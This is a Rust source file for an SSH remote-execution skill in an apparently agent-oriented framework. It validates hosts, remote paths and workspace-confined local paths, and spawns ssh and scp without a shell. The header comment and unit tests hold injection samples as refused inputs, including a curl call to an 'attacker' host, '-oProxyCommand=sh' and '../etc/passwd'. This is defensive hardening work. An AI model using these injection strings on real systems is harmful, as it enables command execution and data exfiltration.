//! SSH remote — execute commands and copy files without a local shell.
//!
//! The old implementation concatenated `host`, `identity`, `source`, and
//! `destination` into a `sh -c` string. A host like
//! `127.0.0.1; curl https://attacker/$(id -u)` therefore ran the suffix on the
//! local machine. Every local process here is now spawned as an argv:
//! `ssh`/`scp` receive the host and paths directly, and local copy paths are
//! confined to the run's workspace.

use crate::traits::{Skill, SkillContext, SkillError, SkillResult};
use async_trait::async_trait;
use ravenbot_core::Permission;
use std::path::PathBuf;

pub struct SshRemoteSkill;

impl SshRemoteSkill {
    pub fn new() -> Self {
        Self
    }
}

fn validate_host(host: &str) -> Result<String, String> {
    let host = host.trim();
    if host.is_empty() || host.len() > 255 {
        return Err("A host must be 1–255 characters.".to_string());
    }
    if host.starts_with('-') || host.chars().any(|ch| ch.is_control() || ch.is_whitespace()) {
        return Err(
            "The host contains whitespace, control characters, or starts with '-'.".to_string(),
        );
    }
    if host
        .chars()
        .any(|ch| matches!(ch, ';' | '|' | '&' | '$' | '`' | '<' | '>' | '(' | ')'))
    {
        return Err("The host contains shell metacharacters.".to_string());
    }
    if !host.chars().all(|ch| {
        ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | '_' | '@' | ':' | '[' | ']' | '%')
    }) {
        return Err(
            "The host contains characters that are not valid in an SSH destination.".to_string(),
        );
    }
    Ok(host.to_string())
}

fn validate_remote_path(path: &str) -> Result<String, String> {
    let path = path.trim();
    if path.is_empty() {
        return Err("A remote path cannot be empty.".to_string());
    }
    if path.starts_with('-')
        || path
            .chars()
            .any(|ch| ch.is_control() || ch == '\n' || ch == '\r')
    {
        return Err("The remote path contains control characters or starts with '-'.".to_string());
    }
    if path.len() > 4096 {
        return Err("The remote path is longer than 4096 characters.".to_string());
    }
    Ok(path.to_string())
}

fn identity_path(raw: Option<&str>) -> Result<Option<PathBuf>, String> {
    let Some(raw) = raw.map(str::trim).filter(|value| !value.is_empty()) else {
        return Ok(None);
    };
    if raw.chars().any(|ch| ch.is_control() || ch.is_whitespace()) {
        return Err("The identity path contains whitespace or control characters.".to_string());
    }
    let path = ravenbot_core::expand_home(raw);
    if !path.is_file() {
        return Err(format!("SSH identity '{}' does not exist.", path.display()));
    }
    Ok(Some(path))
}

fn local_copy_source(ctx: &SkillContext, raw: &str) -> Result<PathBuf, SkillError> {
    let path = ctx.resolve_path(raw)?;
    if !path.exists() {
        return Err(SkillError::InvalidArguments(format!(
            "Local source '{}' does not exist.",
            path.display()
        )));
    }
    Ok(path)
}

fn local_copy_destination(ctx: &SkillContext, raw: &str) -> Result<PathBuf, SkillError> {
    let path = ctx.resolve_path(raw)?;
    if let Some(parent) = path.parent() {
        if !parent.exists() {
            std::fs::create_dir_all(parent).map_err(|error| SkillError::Io(error.to_string()))?;
        }
    }
    Ok(path)
}

async fn run(
    program: &str,
    argv: Vec<String>,
    timeout_secs: u64,
) -> Result<std::process::Output, SkillError> {
    let mut command = tokio::process::Command::new(program);
    command.args(&argv).kill_on_drop(true);
    tokio::time::timeout(
        std::time::Duration::from_secs(timeout_secs),
        command.output(),
    )
    .await
    .map_err(|_| SkillError::Execution(format!("SSH timed out after {timeout_secs}s")))?
    .map_err(|error| SkillError::Execution(error.to_string()))
}

fn clip(mut text: String) -> String {
    const LIMIT: usize = 100_000;
    if text.len() > LIMIT {
        let mut end = LIMIT;
        while end > 0 && !text.is_char_boundary(end) {
            end -= 1;
        }
        text.truncate(end);
        text.push_str("\n… (output truncated)");
    }
    text
}

#[async_trait]
impl Skill for SshRemoteSkill {
    fn id(&self) -> &str {
        "ssh_remote"
    }
    fn name(&self) -> &str {
        "SSH Remote"
    }
    fn description(&self) -> &str {
        "Execute commands on remote machines via SSH, transfer files via SCP, or open a local port forward. Local copy paths stay inside the workspace; remote commands run on the remote host by design."
    }
    fn version(&self) -> &str {
        "1.1.0"
    }
    fn required_permissions(&self) -> Vec<Permission> {
        vec![
            Permission::Shell,
            Permission::Network {
                domains: vec!["*".to_string()],
            },
        ]
    }

    fn input_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["exec", "copy_to", "copy_from", "tunnel", "test"],
                    "description": "SSH action to perform"
                },
                "host": {
                    "type": "string",
                    "description": "Remote host (user@hostname or hostname)"
                },
                "command": {
                    "type": "string",
                    "description": "Command to execute remotely (for exec)"
                },
                "port": {
                    "type": "integer",
                    "description": "SSH port (default: 22)"
                },
                "identity": {
                    "type": "string",
                    "description": "Path to an SSH private key (optional)"
                },
                "source": {
                    "type": "string",
                    "description": "Source path (for copy)"
                },
                "destination": {
                    "type": "string",
                    "description": "Destination path (for copy)"
                },
                "local_port": {
                    "type": "integer",
                    "description": "Local port for tunnel"
                },
                "remote_port": {
                    "type": "integer",
                    "description": "Remote port for tunnel"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Timeout in seconds (default: 30, max: 300)"
                }
            },
            "required": ["action", "host"]
        })
    }

    fn risk(&self) -> crate::traits::SkillRisk {
        crate::traits::SkillRisk::High
    }

    async fn execute(
        &self,
        ctx: &SkillContext,
        args: serde_json::Value,
    ) -> Result<SkillResult, SkillError> {
        let action = args
            .get("action")
            .and_then(|v| v.as_str())
            .ok_or_else(|| SkillError::InvalidArguments("Missing 'action'".into()))?;
        let host = validate_host(
            args.get("host")
                .and_then(|v| v.as_str())
                .ok_or_else(|| SkillError::InvalidArguments("Missing 'host'".into()))?,
        )
        .map_err(SkillError::InvalidArguments)?;
        let port = args.get("port").and_then(|v| v.as_u64()).unwrap_or(22);
        if port == 0 || port > 65535 {
            return Err(SkillError::InvalidArguments("Port must be 1–65535.".into()));
        }
        let timeout = args
            .get("timeout")
            .and_then(|v| v.as_u64())
            .unwrap_or(30)
            .clamp(1, 300);
        let identity = identity_path(args.get("identity").and_then(|v| v.as_str()))
            .map_err(SkillError::InvalidArguments)?;

        let mut common = vec![
            "-o".to_string(),
            format!("ConnectTimeout={timeout}"),
            "-o".to_string(),
            "StrictHostKeyChecking=accept-new".to_string(),
            "-p".to_string(),
            port.to_string(),
        ];
        if let Some(identity) = &identity {
            common.push("-i".to_string());
            common.push(identity.to_string_lossy().to_string());
        }

        let (program, argv) = match action {
            "exec" => {
                let command = args
                    .get("command")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| {
                        SkillError::InvalidArguments("Missing 'command' for exec".into())
                    })?;
                if command.trim().is_empty() || command.len() > 100_000 {
                    return Err(SkillError::InvalidArguments(
                        "The remote command is empty or larger than 100KB.".into(),
                    ));
                }
                let mut argv = common;
                argv.push(host.clone());
                argv.push(command.to_string());
                ("ssh", argv)
            }
            "copy_to" => {
                let source = local_copy_source(
                    ctx,
                    args.get("source")
                        .and_then(|v| v.as_str())
                        .ok_or_else(|| SkillError::InvalidArguments("Missing 'source'".into()))?,
                )?;
                let destination = validate_remote_path(
                    args.get("destination")
                        .and_then(|v| v.as_str())
                        .ok_or_else(|| {
                            SkillError::InvalidArguments("Missing 'destination'".into())
                        })?,
                )
                .map_err(SkillError::InvalidArguments)?;
                let mut argv = vec![
                    "-P".to_string(),
                    port.to_string(),
                    "-o".to_string(),
                    format!("ConnectTimeout={timeout}"),
                    "-o".to_string(),
                    "StrictHostKeyChecking=accept-new".to_string(),
                ];
                if let Some(identity) = &identity {
                    argv.push("-i".to_string());
                    argv.push(identity.to_string_lossy().to_string());
                }
                argv.push(source.to_string_lossy().to_string());
                argv.push(format!("{host}:{destination}"));
                ("scp", argv)
            }
            "copy_from" => {
                let source = validate_remote_path(
                    args.get("source")
                        .and_then(|v| v.as_str())
                        .ok_or_else(|| SkillError::InvalidArguments("Missing 'source'".into()))?,
                )
                .map_err(SkillError::InvalidArguments)?;
                let destination = local_copy_destination(
                    ctx,
                    args.get("destination")
                        .and_then(|v| v.as_str())
                        .ok_or_else(|| {
                            SkillError::InvalidArguments("Missing 'destination'".into())
                        })?,
                )?;
                let mut argv = vec![
                    "-P".to_string(),
                    port.to_string(),
                    "-o".to_string(),
                    format!("ConnectTimeout={timeout}"),
                    "-o".to_string(),
                    "StrictHostKeyChecking=accept-new".to_string(),
                ];
                if let Some(identity) = &identity {
                    argv.push("-i".to_string());
                    argv.push(identity.to_string_lossy().to_string());
                }
                argv.push(format!("{host}:{source}"));
                argv.push(destination.to_string_lossy().to_string());
                ("scp", argv)
            }
            "tunnel" => {
                let local = args
                    .get("local_port")
                    .and_then(|v| v.as_u64())
                    .ok_or_else(|| SkillError::InvalidArguments("Missing 'local_port'".into()))?;
                let remote = args
                    .get("remote_port")
                    .and_then(|v| v.as_u64())
                    .ok_or_else(|| SkillError::InvalidArguments("Missing 'remote_port'".into()))?;
                if local == 0 || local > 65535 || remote == 0 || remote > 65535 {
                    return Err(SkillError::InvalidArguments(
                        "Tunnel ports must be 1–65535.".into(),
                    ));
                }
                let mut argv = common;
                argv.push("-N".to_string());
                argv.push("-L".to_string());
                argv.push(format!("{local}:localhost:{remote}"));
                argv.push(host.clone());
                ("ssh", argv)
            }
            "test" => {
                let mut argv = common;
                argv.push(host.clone());
                argv.push("echo OK".to_string());
                ("ssh", argv)
            }
            other => {
                return Err(SkillError::InvalidArguments(format!(
                    "Unknown action: {other}"
                )));
            }
        };

        let output = run(program, argv.clone(), timeout).await?;
        let stdout = clip(String::from_utf8_lossy(&output.stdout).to_string());
        let stderr = clip(String::from_utf8_lossy(&output.stderr).to_string());
        Ok(SkillResult::success(serde_json::json!({
            "action": action,
            "host": host,
            "argv": argv,
            "stdout": stdout,
            "stderr": stderr,
            "success": output.status.success(),
            "exit_code": output.status.code()
        })))
    }
}

impl Default for SshRemoteSkill {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    #[test]
    fn a_host_cannot_inject_a_local_shell_command() {
        for host in [
            "127.0.0.1; curl https://attacker/$(id -u)",
            "-oProxyCommand=sh",
            "host name",
            "host$(id)",
        ] {
            assert!(validate_host(host).is_err(), "{host} must be refused");
        }
        assert!(validate_host("deploy@example.com").is_ok());
        assert!(validate_host("2001:db8::1").is_ok());
    }

    #[test]
    fn local_copy_paths_are_confined_to_the_workspace() {
        let root = std::env::temp_dir().join(format!("rb-ssh-{}", Uuid::new_v4()));
        std::fs::create_dir_all(root.join("build")).unwrap();
        std::fs::write(root.join("build/out.txt"), "x").unwrap();
        let ctx = SkillContext::with_default_tier(Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4())
            .with_working_dirs(vec![root.clone()]);
        assert!(local_copy_source(&ctx, "build/out.txt").is_ok());
        assert!(local_copy_source(&ctx, "../etc/passwd").is_err());
        assert!(local_copy_destination(&ctx, "../escape").is_err());
    }
}
